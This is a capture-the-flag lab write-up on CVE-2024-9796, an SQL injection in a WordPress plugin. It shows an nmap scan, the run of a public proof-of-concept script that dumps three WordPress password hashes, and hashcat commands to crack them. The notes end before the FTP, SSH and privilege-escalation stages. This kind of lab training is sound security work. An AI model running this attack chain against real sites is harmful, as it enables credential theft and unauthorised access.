This lab explores an unauthenticated SQL injection vulnerability in the WP-Advanced-Search plugin (CVE-2024-9796). By exploiting this flaw, an attacker can enumerate WordPress users, extract password hashes, and crack them to gain FTP access. Further, the attacker retrieves database credentials from wp-config.php, leading to SSH access. Privilege escalation is achieved via an SUID binary vulnerable to shared object injection, granting full root control.

Summary

This lab challenges participants to exploit a critical unauthenticated SQL injection vulnerability in the WP-Advanced-Search WordPress plugin (CVE-2024-9796). Learners will begin by performing service enumeration to discover an exposed WordPress instance. Through SQL injection, they will enumerate users and extract password hashes, which are then cracked to gain FTP access. With access to the WordPress directory, participants will retrieve sensitive database credentials from wp-config.php and pivot to SSH access. The final stage involves escalating privileges via a misconfigured SUID binary vulnerable to shared object injection, ultimately granting root access and flag capture. This lab is ideal for ethical hackers, red teamers, and web application security professionals seeking to strengthen their skills in full-chain exploitation. Key skills include SQL injection, password cracking, lateral movement via service credentials, and privilege escalation through binary exploitation. The lab emphasizes the dangers of insecure plugins, poor credential management, and misconfigured binaries in web hosting environments.

Learning Objectives

## After completing this lab, learners will be able to:

- Perform reconnaissance and identify open services.
- Exploit SQL injection to dump WordPress user credentials.
- Crack password hashes and gain access via FTP.
- Retrieve database credentials from wp-config.php and obtain SSH access.
- Exploit a vulnerable SUID binary to escalate privileges and capture the final flag.


ok  lets get crackin

1. cve-2024-9796
2. enum wp users
3. crack hashes for ftp
4. ftp, steal `wp-config.php`
5. get ssh access
6. suid binary vulnerable to shared object injection
7. root access

```
???(kali?kali)-[~]
??$ sudo nmap -sS -sV WORKAHOLIC
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-25 18:48 +0000
Nmap scan report for WORKAHOLIC (192.168.62.229)
Host is up (0.00045s latency).
Not shown: 970 filtered tcp ports (no-response), 27 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.03 seconds

```


https://github.com/BwithE/CVE-2024-9796/blob/main/poc.py


```
???(kali?kali)-[~/Downloads]
??$ python poc.py -i WORKAHOLIC
[!] WORKAHOLIC has been PWNed!
admin:$P$BDJMoAKLzyLPtatN/WQrbPgHVMmNFn.
charlie:$P$Bd.FfZuysLq8evJ/C6xxWtSB1Ne00p.
ted:$P$BT6Spj.qANCaKd4WR1JGMnC4X.1Kuy/
                                                                                                          
```

now to use hashcat.

mode 400. phppass

```sh
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

echo '$P$BDJMoAKLzyLPtatN/WQrbPgHVMmNFn.'  > hashes
echo '$P$Bd.FfZuysLq8evJ/C6xxWtSB1Ne00p.' >> hashes
echo '$P$BT6Spj.qANCaKd4WR1JGMnC4X.1Kuy/' >> hashes

hashcat -m 400 ./hashes /usr/share/wordlists/rockyou.txt #--show
```

